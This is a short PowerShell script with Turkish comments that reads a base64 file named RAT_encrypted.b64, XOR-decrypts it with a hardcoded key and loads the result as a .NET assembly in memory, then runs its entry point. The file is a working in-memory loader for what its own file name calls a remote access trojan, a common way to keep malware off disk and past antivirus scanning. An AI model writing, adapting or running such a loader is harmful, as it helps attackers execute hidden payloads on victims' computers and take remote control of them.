param (
    [string]$key = "supersecretkey",
     [string]$encoded_data_path = "C:\Users\rust\Desktop\YENÝ\RAT_encrypted.b64"
)

function Convert-Base64ToByteArray {
    param (
        [string]$base64
    )
    [System.Convert]::FromBase64String($base64)
}

function XOR-Decrypt {
    param (
        [byte[]]$data,
        [string]$key
    )
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor [byte][char]$key[$i % $key.Length]
    }
    return $result
}

# Þifrelenmiþ veriyi oku
$encoded_data = Get-Content -Path $encoded_data_path
$encrypted_data = Convert-Base64ToByteArray -base64 $encoded_data

# Þifre çöz ve çalýþtýr
$decrypted_data = XOR-Decrypt -data $encrypted_data -key $key
[System.Reflection.Assembly]::Load($decrypted_data).EntryPoint.Invoke($null, $null)
